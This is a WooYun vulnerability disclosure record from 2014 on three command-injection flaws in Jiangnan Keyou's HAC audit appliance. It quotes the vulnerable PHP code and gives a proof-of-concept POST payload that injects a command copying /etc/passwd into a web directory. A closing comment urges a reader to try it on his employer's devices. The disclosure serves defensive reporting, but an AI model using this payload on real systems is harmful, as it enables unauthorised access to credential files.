{"id": 3832, "wybug_id": "wooyun-2014-052834", "wybug_title": "江南科友HAC运维审计系统存在三处命令注入漏洞（一处自带回显）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "wefgod", "wybug_date": "2014-03-05 12:50", "wybug_open_date": "2014-06-03 12:51", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "命令执行", "命令注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-03：\t细节向公众公开  简要描述： 三处可执行漏洞的地方。版本和上次的版本是一样的 上一发：http://www.wooyun.org/bugs/wooyun-2014-051345 详细说明：  这次也还是在内网测试的。第一处来一个执行可回显的（写shell请自行研究）：system\\sys_ping.php\nif(!empty($_POST['IP_addr'])){\t$cmd = \"ping -c 4 -s 32 \".$_POST['IP_addr']; //问题参数IP_addr\texec($cmd, $list); \tflush(); \tfor($i=0;$i < count($list);$i++)\t{\t$row[$i]['list_msg'] = $list[$i];\t}\t$st->assign('pingip_value',$_POST['IP_addr']);\t$st->assign('msg',$row);}$st->assign('nav_title', '系统管理>>网络配置>>Ping功能');$st->assign('h1','sys_ping');$st->output();\n\n\n\n\n   漏洞证明：  第二处：\nsystem\\tcpdump.php\tif(!empty($_POST['eth0']))\t{\t\t$filename0=\"/tmp/\".$_POST['eth0'].\"_\".$data['0'].\".tcp\"; //eth0，其实下面还有其它参数的，雷同\t\t//echo $filename0;\t\texec(MYSUDO.\"/usr/sbin/tcpdump -i eth0 -c $package  -w $filename0 > /tmp/null &\");\t}\nPost:https://1.1.1.1/system/tcpdump.phpop_type=downloadcatch&eth0=1 | cp /etc/passwd /usr/local/apache2/htdocs/project/www/upload/123.txt | 1&dump=\n\n\n\n\n\n最后这里不具体测试了。给出代码例子system\\sys_basic.php\nfunction CliIP($URL,$stat,$ipstr){\texec(MYSUDO.\"chown -R daemon:daemon\".$URL);  \tif(file_exists($URL)){\t\texec(MYSUDO.\"sh \".$URL.\" \".$stat.\" \".$ipstr,$output,$er);\t\treturn $output[count($output)-1];\t}}\t//MAC地址绑定\tif(!empty($_POST['flag']) && $_GET['show_flag'] > 0)\t{\tswitch($_POST['flag']) {\t\tcase '1':\t\t$AA=CliIP('/usr/local/keyou/Bin/bindmac.sh','add',$_POST['IP'].\" \".$_POST['MAC']); //调用的这有问题。\t\tif($AA)\t\t$bindmac_flag = $AA;\t\telse\t\t$bindmac_flag = -1;\t\tbreak;\t\tcase '2':\t\t//echo $_POST['MACstr'];\t\t$AA=CliIP('/usr/local/keyou/Bin/bindmac.sh','del',$_POST['MACstr']);\t\t\tif($AA)\t\t$bindmac_flag = $AA;\t\telse\t\t$bindmac_flag = -2;\t\t\tbreak;\t}}\n   修复方案：     版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-03-10 21:05 厂商回复： CNVD确认所述漏洞机理，未在实例上进行复现，已经由CNVD通过直接联系渠道转报给江南科友公司，由其后续处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-05 12:52 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  贤弟这是要在乌云发家致富的节奏呀。    \n     2014-03-05 12:53 |    \t\t光刃 \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:24        | 萝卜白菜保平安)\t\t \n  @瘦蛟舞 是啊，已经蹦到第12名了    \n     2014-03-05 13:17 |    \t\t刺刺 \t\t\t( 普通白帽子  |\t\t\t        Rank:603 漏洞数:52        | 真正的安全并不是技术，而是人类善良的心灵...)\t\t \n  壕，我的消息提醒全被你占据：你关注的白帽子 wefgod 发表了漏洞……你关注的白帽子 wefgod 发表了漏洞……你关注的白帽子 wefgod 发表了漏洞……你关注的白帽子 wefgod 发表了漏洞……你关注的白帽子 wefgod 发表了漏洞……    \n     2014-03-05 14:05 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  不是土豪，也发不了家啊    \n     2014-03-05 15:42 |    \t\twinsyk \t\t\t( 普通白帽子  |\t\t\t        Rank:108 漏洞数:16        | 越长大越孤单)\t\t \n  洞主，你有运维审计设备测的？    \n     2014-03-05 16:24 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @winsyk 某些地方看见的    \n     2014-06-04 10:31 |    \t\tAndy_ \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:7        | 中行打酱油第一人！！)\t\t \n  我靠( ‵o′)凸，我们单位有好几台江南科友的设备！！    \n     2014-06-04 12:49 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Andy_ 去试试吧    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}